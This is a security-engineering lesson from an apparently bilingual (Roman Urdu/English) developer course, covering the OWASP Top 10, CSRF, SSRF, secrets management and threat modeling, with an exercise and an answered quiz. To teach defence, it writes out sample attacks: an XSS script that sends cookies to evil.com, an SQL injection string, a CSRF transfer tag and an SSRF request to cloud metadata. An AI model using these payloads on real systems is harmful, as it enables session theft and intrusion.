@@ -1,0 +1,488 @@
+================================================================
+SENIOR SOFTWARE ENGINEER COURSE - 2026
+PART 13: SECURITY ENGINEERING
+(Secure Software Development)
+================================================================
+
+SEEKHNE KE MAQASID:
+- OWASP Top 10 samajhna
+- Common attacks aur unse bachna
+- Secrets management
+- Threat modeling
+
+================================================================
+SECTION 1: SECURITY MINDSET
+================================================================
+
+Senior engineer sochta hai: "Kaise koi is system ko tod sakta hai?"
+
+Security by design:
+  - Security baad mein add karne ki cheez nahi
+  - Requirements phase se hi sochna shuru karo
+  - Har feature mein attack surface sochna
+
+Principle of Least Privilege:
+  - Component/user ko sirf utna access do jitna zaroori hai
+  - Example: Read-only service ko DB write access mat do
+
+Defense in Depth:
+  - Multiple layers of security
+  - Ek layer break ho → baaki layers protect karein
+  - Perimeter + Application + Data layer security
+
+================================================================
+SECTION 2: OWASP TOP 10
+================================================================
+
+OWASP = Open Web Application Security Project
+OWASP Top 10 = Sabse common web security vulnerabilities
+
+--- 1. INJECTION (SQL Injection, Command Injection) ---
+
+Attack:
+  User input: ' OR '1'='1
+  Query: SELECT * FROM users WHERE email = '' OR '1'='1'
+  Result: Sab users return → Authentication bypass!
+
+Fix: Parameterized queries / Prepared statements:
+  
+  BAD:
+    const query = `SELECT * FROM users WHERE email = '${email}'`;
+    
+  GOOD:
+    const query = 'SELECT * FROM users WHERE email = $1';
+    const result = await db.query(query, [email]);
+    
+  ORM (Prisma/TypeORM) use karo — auto-parameterized.
+
+--- 2. BROKEN AUTHENTICATION ---
+
+Common mistakes:
+  - Weak passwords allowed
+  - No rate limiting on login
+  - Passwords stored plain text
+  - Weak JWT secrets
+  - Long-lived tokens
+
+Fixes:
+  - bcrypt for password hashing (cost factor 12+)
+  - Rate limit login (5 attempts/15 min)
+  - Short JWT expiry (15-60 min)
+  - Strong secrets (256-bit+)
+  - Account lockout after X failures
+
+--- 3. SENSITIVE DATA EXPOSURE ---
+
+What to protect:
+  - Passwords
+  - Credit card numbers
+  - SSN, NIC numbers
+  - Health data
+  - Personal emails/phones
+
+Fixes:
+  - HTTPS everywhere (TLS 1.2+)
+  - Encrypt sensitive data at rest
+  - Never log sensitive data
+  - Minimal data collection
+  - Data masking in logs (email: a***@gmail.com)
+
+--- 4. XML EXTERNAL ENTITIES (XXE) ---
+
+Avoid XML parsing of untrusted input.
+Use JSON APIs where possible.
+If XML required → disable external entity processing.
+
+--- 5. BROKEN ACCESS CONTROL ---
+
+Common mistakes:
+  - Sirf frontend mein access control
+  - IDOR (Insecure Direct Object Reference)
+
+IDOR Example:
+  GET /api/orders/123
+  User A is logged in, order 123 belongs to User B.
+  Server sirf ID check karta hai, ownership nahi.
+  User A can see User B's order!
+
+Fix:
+  const order = await orderRepo.findById(orderId);
+  if (!order) throw new NotFoundError('Order');
+  
+  // Ownership check!
+  if (order.userId !== req.user.id && req.user.role !== 'admin') {
+    throw new ForbiddenError('Cannot access this order');
+  }
+
+--- 6. SECURITY MISCONFIGURATION ---
+
+Common mistakes:
+  - Default credentials (admin/admin)
+  - Debug mode in production
+  - Unnecessary ports open
+  - Verbose error messages (stack traces exposed)
+  - Directory listing enabled
+  - Unnecessary features enabled
+
+Fixes:
+  - Environment-specific configs
+  - Security headers
+  - Remove unused features
+  - Regular security audits
+
+Security Headers:
+  app.use(helmet()); // Express - adds multiple security headers
+  
+  // Manual:
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('Strict-Transport-Security', 'max-age=31536000');
+  res.setHeader('Content-Security-Policy', "default-src 'self'");
+
+--- 7. XSS (Cross-Site Scripting) ---
+
+Attack:
+  User comment: <script>document.location='https://evil.com?c='+document.cookie</script>
+  If displayed without escaping → cookie stolen!
+
+Types:
+  Stored XSS: DB mein store hota hai (comments, usernames)
+  Reflected XSS: URL parameters mein
+  DOM XSS: Client-side JavaScript mein
+
+Fixes:
+  - React auto-escapes — don't use dangerouslySetInnerHTML
+  - DOMPurify for HTML content
+  - Content-Security-Policy header
+  - HttpOnly cookies (JS se access nahi)
+
+--- 8. INSECURE DESERIALIZATION ---
+
+Never deserialize untrusted data directly.
+Validate and sanitize before processing.
+
+--- 9. USING COMPONENTS WITH KNOWN VULNERABILITIES ---
+
+npm packages outdated → security holes!
+
+Fixes:
+  npm audit                    # Check vulnerabilities
+  npm audit fix               # Fix automatically
+  dependabot / snyk           # Automated dependency updates
+  
+  Lock file commit karo (package-lock.json)
+  Regular dependency updates
+
+--- 10. INSUFFICIENT LOGGING & MONITORING ---
+
+Without proper logging:
+  - Breach detect nahi hogi
+  - Attack pattern visible nahi
+  - Forensics impossible
+
+Fixes:
+  - Log all auth events (login, logout, failures)
+  - Log access control failures
+  - Log suspicious patterns
+  - Alerts on anomalies
+  - SIEM integration for large systems
+
+================================================================
+SECTION 3: CSRF (Cross-Site Request Forgery)
+================================================================
+
+Attack:
+  User mybank.com pe logged in hai.
+  Attacker ka evil.com pe:
+    <img src="https://mybank.com/transfer?to=attacker&amount=1000" />
+  Browser automatically cookie bhejta hai → Transfer execute!
+
+Fixes:
+
+  1. SameSite Cookie:
+     Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
+     → Cross-site requests mein cookie nahi jayegi
+
+  2. CSRF Token:
+     Server unique token generate kare
+     Form mein hidden field
+     Server verify kare
+
+  3. Custom Request Header:
+     API calls mein custom header: X-Requested-With: XMLHttpRequest
+     Browsers cross-site requests mein custom headers nahi bhej sakte
+
+================================================================
+SECTION 4: SSRF (Server-Side Request Forgery)
+================================================================
+
+Attack:
+  API accept karta hai URL parameter:
+  GET /api/fetch?url=https://external.com/data
+  
+  Attacker bhejta hai:
+  GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
+  → AWS metadata service se credentials mil gayi!
+
+Fixes:
+  - Allow-list for external URLs
+  - Block internal IP ranges (10.x, 172.x, 192.168.x, 169.254.x)
+  - DNS rebinding protection
+  - Network-level egress filtering
+
+================================================================
+SECTION 5: SECRETS MANAGEMENT
+================================================================
+
+NEVER secrets code mein:
+  BAD:
+    const apiKey = 'sk-1234567890abcdef'; // In code
+    
+  GOOD:
+    const apiKey = process.env.STRIPE_SECRET_KEY;
+
+Environment Variables:
+  .env file local development ke liye
+  .env NEVER commit karo Git mein!
+  .gitignore mein add karo
+
+Production Secrets:
+  - AWS Secrets Manager
+  - HashiCorp Vault
+  - Kubernetes Secrets
+  - Cloud provider native solutions
+
+Replit:
+  - Replit Secrets tab use karo
+  - process.env.SECRET_NAME se access
+
+Rotation:
+  - Secrets regularly rotate karo
+  - Old secrets expire karo
+  - Audit who has access
+
+================================================================
+SECTION 6: ENCRYPTION
+================================================================
+
+--- ENCRYPTION AT REST ---
+
+Sensitive data encrypt karo database mein:
+  - Credit card numbers
+  - SSN
+  - Private messages
+
+  import crypto from 'crypto';
+  
+  const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
+  const IV_LENGTH = 16;
+  
+  function encrypt(text: string): string {
+    const iv = crypto.randomBytes(IV_LENGTH);
+    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
+    const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
+    return iv.toString('hex') + ':' + encrypted.toString('hex');
+  }
+  
+  function decrypt(text: string): string {
+    const [ivHex, encryptedHex] = text.split(':');
+    const iv = Buffer.from(ivHex, 'hex');
+    const encrypted = Buffer.from(encryptedHex, 'hex');
+    const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
+    return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString();
+  }
+
+--- ENCRYPTION IN TRANSIT ---
+
+HTTPS (TLS) → Har production service pe
+Never HTTP in production
+
+================================================================
+SECTION 7: SECURE COOKIES
+================================================================
+
+Proper cookie configuration:
+
+  res.cookie('session', token, {
+    httpOnly: true,     // JavaScript access nahi (XSS protection)
+    secure: true,       // HTTPS only
+    sameSite: 'strict', // CSRF protection
+    maxAge: 3600000,    // 1 hour
+    path: '/',
+    domain: '.yourdomain.com'
+  });
+
+Cookie vs localStorage:
+  localStorage: XSS attack mein steal ho sakta hai
+  httpOnly cookie: JavaScript access nahi → XSS se safe
+
+================================================================
+SECTION 8: API SECURITY
+================================================================
+
+API Security Checklist:
+
+Authentication:
+  □ Har protected endpoint pe auth check
+  □ JWT properly verified (algorithm, expiry, signature)
+  □ No sensitive data in JWT payload
+  □ Refresh token rotation
+
+Authorization:
+  □ Resource ownership check (not just role)
+  □ Horizontal privilege escalation check
+  □ Vertical privilege escalation check
+
+Input:
+  □ All input validated
+  □ Request size limit (express: limit: '10mb')
+  □ SQL injection safe (parameterized)
+  □ File upload validation (type, size)
+
+Rate Limiting:
+  □ Login endpoint (5/15min)
+  □ Password reset (3/hour)
+  □ API general (1000/hour)
+
+Headers:
+  □ Security headers (helmet.js)
+  □ CORS properly configured
+  □ No sensitive data in response headers
+
+================================================================
+SECTION 9: THREAT MODELING
+================================================================
+
+STRIDE Framework:
+
+S — Spoofing: Identity fraud
+    Threat: Attacker users ki identity assume kare
+    Mitigation: Strong authentication, JWT verification
+
+T — Tampering: Data modification
+    Threat: Data in transit ya rest mein change ho
+    Mitigation: HTTPS, signatures, checksums
+
+R — Repudiation: Denying actions
+    Threat: User deny kare ke usne action kiya
+    Mitigation: Audit logs, non-repudiation
+
+I — Information Disclosure: Data leak
+    Threat: Sensitive data exposed
+    Mitigation: Encryption, access control, minimal data
+
+D — Denial of Service: Availability attack
+    Threat: Service ko overwhelm karo
+    Mitigation: Rate limiting, CDN, auto-scaling
+
+E — Elevation of Privilege: Gaining extra access
+    Threat: Low-privilege user admin access gain kare
+    Mitigation: Proper authorization checks
+
+Threat Modeling Process:
+  1. System diagram banao
+  2. Entry points identify karo
+  3. Assets identify karo (kya protect karna hai)
+  4. STRIDE apply karo har entry point pe
+  5. Threats prioritize karo
+  6. Mitigations design karo
+
+================================================================
+SECTION 10: SUPPLY CHAIN SECURITY
+================================================================
+
+2021: Log4Shell vulnerability → millions of systems affected
+2020: SolarWinds attack → supply chain compromise
+
+Protection:
+  - Dependency audit (npm audit, snyk)
+  - Lock files use karo
+  - Minimal dependencies
+  - Trusted sources only
+  - Automated scanning (GitHub Dependabot)
+  - Container image scanning
+
+================================================================
+EXERCISE — PART 13
+================================================================
+
+SCENARIO: Login system design karo with security best practices.
+
+Identify security requirements for:
+  - Registration
+  - Login
+  - Password reset
+  - Session management
+
+Then identify potential attacks aur mitigations.
+
+SAMPLE ANSWER:
+
+Registration:
+  - Password min 8 chars, complexity requirements
+  - Email verification required
+  - Rate limit (10 accounts/hour per IP)
+  - Common password list check
+  - bcrypt hash (cost 12)
+
+Login:
+  - Rate limit (5 attempts/15 min per email + IP)
+  - Account lockout after 10 failures
+  - CAPTCHA after 3 failures
+  - Timing-safe comparison
+  - Log failed attempts
+  - Alert on multiple failures
+
+Password Reset:
+  - Token: 32 random bytes (hex)
+  - Expiry: 1 hour
+  - One-time use
+  - Same success message (email exists ya nahi)
+  - Old tokens invalidate on use
+
+Session:
+  - httpOnly, Secure, SameSite=Strict cookie
+  - 1 hour access token
+  - 7 day refresh token (rotation)
+  - Logout → both tokens invalidate
+
+================================================================
+QUIZ — PART 13
+================================================================
+
+Q1: SQL injection se kaise bachte hain?
+    (a) HTTPS use karo
+    (b) Parameterized queries / prepared statements use karo
+    (c) Input length limit karo
+    (d) Logs enable karo
+
+Jawab: (b)
+
+Q2: CSRF attack kya hai?
+    (a) SQL injection ka type
+    (b) Attacker user ki browser se unauthorized request karwata hai
+    (c) Password brute force
+    (d) XSS ka type
+
+Jawab: (b)
+
+Q3: httpOnly cookie kyun zaroori hai?
+    (a) Server fast hota hai
+    (b) JavaScript se cookie access nahi — XSS attack se safe
+    (c) HTTPS required hota hai
+    (d) CSRF prevent hota hai
+
+Jawab: (b)
+
+Q4: IDOR (Insecure Direct Object Reference) kya hai?
+    (a) SQL injection type
+    (b) User kisi aur ka resource directly ID se access kare without ownership check
+    (c) Broken authentication
+    (d) XSS attack
+
+Jawab: (b)
+
+================================================================
+AGLA PART: Part 14 — Testing & Quality Engineering
+================================================================
